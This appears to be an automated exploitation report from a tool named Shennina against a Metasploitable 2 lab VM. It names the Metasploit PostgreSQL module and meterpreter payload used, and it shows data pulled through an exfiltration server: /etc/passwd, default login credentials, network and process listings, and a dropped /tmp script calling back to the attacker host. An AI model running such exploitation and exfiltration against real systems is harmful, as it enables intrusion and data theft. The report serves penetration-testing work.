
# Shennina Exploitation Report

## Target: `target.local`

## Exploit: `exploit/linux/postgres/postgres_payload`

## Shell Type: `meterpreter`

## Payload: `payload/linux/x86/meterpreter/bind_ipv6_tcp`



---

# Data Obtained From Target via Exfiltration Server
### files_etc_passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:65534::/var/lib/snmp:/bin/false

```

### files_etc_issue

```
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started



```

### ifconfig

```
eth0      Link encap:Ethernet  HWaddr 00:0c:29:68:2e:ed  
          inet addr:192.168.213.130  Bcast:192.168.213.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe68:2eed/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2220 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1549 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:3120554 (2.9 MB)  TX bytes:121270 (118.4 KB)
          Interrupt:19 Base address:0x2000 

eth1      Link encap:Ethernet  HWaddr 00:0c:29:68:2e:f7  
          BROADCAST MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
          Interrupt:16 Base address:0x2080 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:298 errors:0 dropped:0 overruns:0 frame:0
          TX packets:298 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:117793 (115.0 KB)  TX bytes:117793 (115.0 KB)


```

### uname

```
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

```

### id_command

```
uid=108(postgres) gid=117(postgres) groups=114(ssl-cert),117(postgres)

```

### user

```
postgres

```

### ps_aux

```
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  0.3   2844  1696 ?        Ss   11:49   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S<   11:49   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S<   11:49   0:00 [migration/0]
root         4  0.0  0.0      0     0 ?        S<   11:49   0:00 [ksoftirqd/0]
root         5  0.0  0.0      0     0 ?        S<   11:49   0:00 [watchdog/0]
root         6  0.0  0.0      0     0 ?        S<   11:49   0:00 [events/0]
root         7  0.0  0.0      0     0 ?        S<   11:49   0:00 [khelper]
root        41  0.0  0.0      0     0 ?        S<   11:49   0:00 [kblockd/0]
root        68  0.0  0.0      0     0 ?        S<   11:49   0:00 [kseriod]
root       187  0.0  0.0      0     0 ?        S    11:49   0:00 [pdflush]
root       188  0.0  0.0      0     0 ?        S    11:49   0:00 [pdflush]
root       189  0.0  0.0      0     0 ?        S<   11:49   0:00 [kswapd0]
root       230  0.0  0.0      0     0 ?        S<   11:49   0:00 [aio/0]
root      1254  0.0  0.0      0     0 ?        S<   11:49   0:00 [ksnapd]
root      1447  0.0  0.0      0     0 ?        S<   11:49   0:00 [ata/0]
root      1450  0.0  0.0      0     0 ?        S<   11:49   0:00 [ata_aux]
root      1471  0.0  0.0      0     0 ?        S<   11:49   0:00 [ksuspend_usbd]
root      1476  0.0  0.0      0     0 ?        S<   11:49   0:00 [khubd]
root      2338  0.0  0.0      0     0 ?        S<   11:49   0:00 [scsi_eh_0]
root      2349  0.0  0.0      0     0 ?        S<   11:49   0:00 [scsi_eh_1]
root      2351  0.0  0.0      0     0 ?        S<   11:49   0:00 [scsi_eh_2]
root      2515  0.0  0.0      0     0 ?        S<   11:49   0:00 [kjournald]
root      2692  0.0  0.1   2216   644 ?        S<s  11:49   0:00 /sbin/udevd --daemon
root      3047  0.0  0.0      0     0 ?        S<   11:49   0:00 [kpsmoused]
root      3979  0.0  0.0      0     0 ?        S<   11:49   0:00 [kjournald]
daemon    4121  0.0  0.1   1836   532 ?        Ss   11:49   0:00 /sbin/portmap
dhcp      4136  0.0  0.1   2436   788 ?        S<s  11:49   0:00 dhclient3 -e IF_METRIC=100 -pf /var/run/dhclient.eth0.pid -lf /var/lib/dhcp3/dhclient.eth0.leases eth0
statd     4182  0.0  0.1   1900   728 ?        Ss   11:49   0:00 /sbin/rpc.statd
root      4188  0.0  0.0      0     0 ?        S<   11:49   0:00 [rpciod/0]
root      4203  0.0  0.1   3648   564 ?        Ss   11:49   0:00 /usr/sbin/rpc.idmapd
root      4433  0.0  0.0   1716   488 tty4     Ss+  11:49   0:00 /sbin/getty 38400 tty4
root      4436  0.0  0.0   1716   488 tty5     Ss+  11:49   0:00 /sbin/getty 38400 tty5
root      4442  0.0  0.0   1716   488 tty2     Ss+  11:49   0:00 /sbin/getty 38400 tty2
root      4445  0.0  0.0   1716   488 tty3     Ss+  11:49   0:00 /sbin/getty 38400 tty3
root      4448  0.0  0.0   1716   492 tty6     Ss+  11:49   0:00 /sbin/getty 38400 tty6
syslog    4484  0.0  0.1   1936   648 ?        Ss   11:49   0:00 /sbin/syslogd -u syslog
root      4539  0.0  0.1   1872   540 ?        S    11:49   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
klog      4541  0.0  0.4   3280  2072 ?        Ss   11:49   0:00 /sbin/klogd -P /var/run/klogd/kmsg
bind      4566  0.0  1.4  35408  7684 ?        Ssl  11:49   0:00 /usr/sbin/named -u bind
root      4590  0.0  0.1   5312   992 ?        Ss   11:49   0:00 /usr/sbin/sshd
root      4671  0.0  0.2   2768  1304 ?        S    11:49   0:00 /bin/sh /usr/bin/mysqld_safe
mysql     4713  0.0  3.3 127560 17028 ?        Sl   11:49   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --socket=/var/run/mysqld/mysqld.sock
root      4715  0.0  0.1   1700   556 ?        S    11:49   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
postgres  4795  0.0  0.9  41340  5072 ?        S    11:49   0:00 /usr/lib/postgresql/8.3/bin/postgres -D /var/lib/postgresql/8.3/main -c config_file=/etc/postgresql/8.3/main/postgresql.conf
postgres  4798  0.0  0.3  41340  1748 ?        Rs   11:49   0:00 postgres: writer process                                                                                                    
postgres  4799  0.0  0.2  41340  1288 ?        Ss   11:49   0:00 postgres: wal writer process                                                                                                
postgres  4800  0.0  0.2  41476  1408 ?        Ss   11:49   0:00 postgres: autovacuum launcher process                                                                                       
postgres  4801  0.0  0.2  12660  1156 ?        Ss   11:49   0:00 postgres: stats collector process                                                                                           
daemon    4822  0.0  0.0   2316   420 ?        SNs  11:49   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon    4823  0.0  0.0   2316   212 ?        SN   11:49   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
root      4877  0.0  0.0      0     0 ?        S    11:49   0:00 [lockd]
root      4878  0.0  0.0      0     0 ?        S<   11:49   0:00 [nfsd4]
root      4879  0.0  0.0      0     0 ?        S    11:49   0:00 [nfsd]
root      4880  0.0  0.0      0     0 ?        S    11:49   0:00 [nfsd]
root      4881  0.0  0.0      0     0 ?        S    11:49   0:00 [nfsd]
root      4882  0.0  0.0      0     0 ?        S    11:49   0:00 [nfsd]
root      4883  0.0  0.0      0     0 ?        S    11:49   0:00 [nfsd]
root      4884  0.0  0.0      0     0 ?        S    11:49   0:00 [nfsd]
root      4885  0.0  0.0      0     0 ?        S    11:49   0:00 [nfsd]
root      4886  0.0  0.0      0     0 ?        S    11:49   0:00 [nfsd]
root      4890  0.0  0.0   2424   332 ?        Ss   11:49   0:00 /usr/sbin/rpc.mountd
root      4958  0.0  0.3   5412  1728 ?        Ss   11:49   0:00 /usr/lib/postfix/master
postfix   4962  0.0  0.3   5420  1648 ?        S    11:49   0:00 pickup -l -t fifo -u -c
postfix   4964  0.0  0.3   5460  1684 ?        S    11:49   0:00 qmgr -l -t fifo -u
root      4966  0.0  0.2   5388  1204 ?        Ss   11:49   0:00 /usr/sbin/nmbd -D
root      4968  0.0  0.2   7724  1360 ?        Ss   11:49   0:00 /usr/sbin/smbd -D
root      4971  0.0  0.1   7724   808 ?        S    11:49   0:00 /usr/sbin/smbd -D
snmp      4974  0.0  0.7   8488  3756 ?        S    11:49   0:00 /usr/sbin/snmpd -Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1
root      4989  0.0  0.1   2424   856 ?        Ss   11:49   0:00 /usr/sbin/xinetd -pidfile /var/run/xinetd.pid -stayalive -inetd_compat
daemon    5034  0.0  0.0   2316   212 ?        SN   11:49   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
proftpd   5035  0.0  0.3   9948  1596 ?        Ss   11:49   0:00 proftpd: (accepting connections)
daemon    5051  0.0  0.0   1984   420 ?        Ss   11:49   0:00 /usr/sbin/atd
root      5064  0.0  0.1   2104   892 ?        Ss   11:49   0:00 /usr/sbin/cron
root      5094  0.0  0.0   2052   352 ?        Ss   11:49   0:00 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
root      5095  0.0  0.0   2052   480 ?        S    11:49   0:00 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
tomcat55  5097  1.2 17.3 372292 89632 ?        Sl   11:49   0:15 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
root      5117  0.0  0.4  10596  2560 ?        Ss   11:49   0:00 /usr/sbin/apache2 -k start
www-data  5118  0.0  0.3  10596  1948 ?        S    11:49   0:00 /usr/sbin/apache2 -k start
www-data  5120  0.0  0.3  10596  1948 ?        S    11:49   0:00 /usr/sbin/apache2 -k start
www-data  5122  0.0  0.3  10596  1948 ?        S    11:49   0:00 /usr/sbin/apache2 -k start
www-data  5126  0.0  0.3  10596  1948 ?        S    11:49   0:00 /usr/sbin/apache2 -k start
www-data  5127  0.0  0.3  10596  1948 ?        S    11:49   0:00 /usr/sbin/apache2 -k start
root      5138  0.0  5.1  66344 26472 ?        Sl   11:49   0:00 /usr/bin/rmiregistry
root      5143  0.1  0.4  12208  2568 ?        Sl   11:49   0:01 ruby /usr/sbin/druby_timeserver.rb
root      5151  0.0  0.4   8540  2364 ?        S    11:49   0:00 /usr/bin/unrealircd
root      5155  0.0  0.0   1716   488 tty1     Ss+  11:49   0:00 /sbin/getty 38400 tty1
root      5161  0.0  2.3  14036 12020 ?        S    11:49   0:00 Xtightvnc :0 -desktop X -auth /root/.Xauthority -geometry 1024x768 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5900 -fp /usr/X11R6/lib/X11/fonts/Type1/,/usr/X11R6/lib/X11/fonts/Speedo/,/usr/X11R6/lib/X11/fonts/misc/,/usr/X11R6/lib/X11/fonts/75dpi/,/usr/X11R6/lib/X11/fonts/100dpi/,/usr/share/fonts/X11/misc/,/usr/share/fonts/X11/Type1/,/usr/share/fonts/X11/75dpi/,/usr/share/fonts/X11/100dpi/ -co /etc/X11/rgb
daemon    5162  0.0  0.0   2316   212 ?        SN   11:49   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
root      5168  0.0  0.2   2724  1192 ?        S    11:49   0:00 /bin/sh /root/.vnc/xstartup
root      5171  0.0  0.4   5936  2568 ?        S    11:49   0:00 xterm -geometry 80x24+10+10 -ls -title X Desktop
root      5175  0.0  0.9   8988  4996 ?        S    11:49   0:00 fluxbox
root      5196  0.0  0.2   2852  1544 pts/0    Ss+  11:49   0:00 -bash
postgres  5321  0.1  0.4  43360  2444 ?        S    12:09   0:00 postgres: postgres template1 192.168.213.1(45229) CREATE FUNCTION                                                           
postgres  5325  0.0  0.2   3240  1444 ?        S    12:09   0:00 sh /tmp/.2e900dd5-98c5-4969-9d1e-2bec4c1719fd.sh 192.168.213.1:8040 2e900dd5-98c5-4969-9d1e-2bec4c1719fd
postgres  5326  0.0  0.1   3288   944 ?        R    12:09   0:00 sh /tmp/.2e900dd5-98c5-4969-9d1e-2bec4c1719fd.sh 192.168.213.1:8040 2e900dd5-98c5-4969-9d1e-2bec4c1719fd
postgres  5368  0.0  0.1   3288   768 ?        R    12:09   0:00 sh /tmp/.2e900dd5-98c5-4969-9d1e-2bec4c1719fd.sh 192.168.213.1:8040 2e900dd5-98c5-4969-9d1e-2bec4c1719fd
postgres  5369  0.0  0.1   2364   932 ?        R    12:09   0:00 ps aux

```

